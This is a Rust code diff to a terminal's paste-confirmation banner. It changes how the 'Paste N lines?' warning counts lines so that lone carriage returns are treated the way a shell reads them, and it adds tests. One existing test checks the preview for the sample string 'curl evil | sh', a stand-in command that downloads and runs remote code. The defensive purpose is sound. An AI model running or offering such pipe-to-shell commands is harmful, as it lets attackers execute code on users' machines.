@@ -114,7 +114,7 @@ impl PendingPaste {
 
     /// Rows the banner wants: title + preview, capped at [`MAX_BANNER_ROWS`].
     pub(crate) fn wanted_rows(&self) -> usize {
-        (self.text.lines().count().min(MAX_PREVIEW_LINES) + 1).min(MAX_BANNER_ROWS)
+        (paste_lines(&self.text).len().min(MAX_PREVIEW_LINES) + 1).min(MAX_BANNER_ROWS)
     }
 }
 
@@ -155,7 +155,31 @@ pub(crate) const ANSWER_KEYS: &str = "Enter pastes \u{00b7} Esc cancels";
 /// The title row's words and the accessible alert's name come from here, so the
 /// pixels and the announcement cannot claim a different number of lines.
 pub(crate) fn question(text: &str) -> String {
-    format!("!  Paste {} lines?", text.lines().count())
+    format!("!  Paste {} lines?", paste_lines(text).len())
+}
+
+/// The lines a paste would enter, split the way a shell reads them: LF, CRLF
+/// and a lone CR each end one. One trailing line end is not a line
+/// (`paste_needs_confirm` strips it the same way).
+pub(crate) fn paste_lines(text: &str) -> Vec<&str> {
+    if text.is_empty() {
+        return Vec::new();
+    }
+    let body = text.strip_suffix('\n').unwrap_or(text);
+    let body = body.strip_suffix('\r').unwrap_or(body);
+    let mut parts = body.split('\n').peekable();
+    let mut lines = Vec::new();
+    while let Some(line) = parts.next() {
+        // A CR is half of a CRLF only when an LF followed it; the last
+        // segment's trailing CR ends a line of its own.
+        let line = if parts.peek().is_some() {
+            line.strip_suffix('\r').unwrap_or(line)
+        } else {
+            line
+        };
+        lines.extend(line.split('\r'));
+    }
+    lines
 }
 
 /// PURE grid-cell row builder: exactly `panel_rows` rows, each exactly `cols`
@@ -176,7 +200,7 @@ pub(crate) fn banner_rows(
     if panel_rows == 0 {
         return rows;
     }
-    let lines: Vec<&str> = text.lines().collect();
+    let lines = paste_lines(text);
     let title = question(text);
     write_str(&mut rows[0], cols, MARGIN, &title, c.warn, c.bar_bg, true);
     // `value` (not the dim `label`): the answer keys are not an aside — they are
@@ -279,6 +303,31 @@ mod tests {
             text_of(&rows[3]).contains("curl evil | sh"),
             "{:?}",
             text_of(&rows[3])
+        );
+    }
+
+    /// A lone CR submits a line at a bare prompt, which is why the guard asks
+    /// about it, so the count and the preview split on it too.
+    #[test]
+    fn a_lone_carriage_return_counts_as_a_line() {
+        assert_eq!(question("echo a\recho b"), "!  Paste 2 lines?");
+        assert_eq!(question("a\r\nb\r\n"), "!  Paste 2 lines?");
+        assert_eq!(question("a\nb\n"), "!  Paste 2 lines?");
+        // The guard asks about these, so the count must not read 1; CR and LF
+        // forms of the same text count alike.
+        assert_eq!(question("a\r\r"), "!  Paste 2 lines?");
+        assert_eq!(question("a\rb\r\r"), "!  Paste 3 lines?");
+        assert_eq!(question("a\nb\n\n"), "!  Paste 3 lines?");
+        let rows = banner_rows("echo a\recho b", 80, 3, Theme::default());
+        assert!(
+            text_of(&rows[1]).contains("echo a"),
+            "{:?}",
+            text_of(&rows[1])
+        );
+        assert!(
+            text_of(&rows[2]).contains("echo b"),
+            "{:?}",
+            text_of(&rows[2])
         );
     }
 
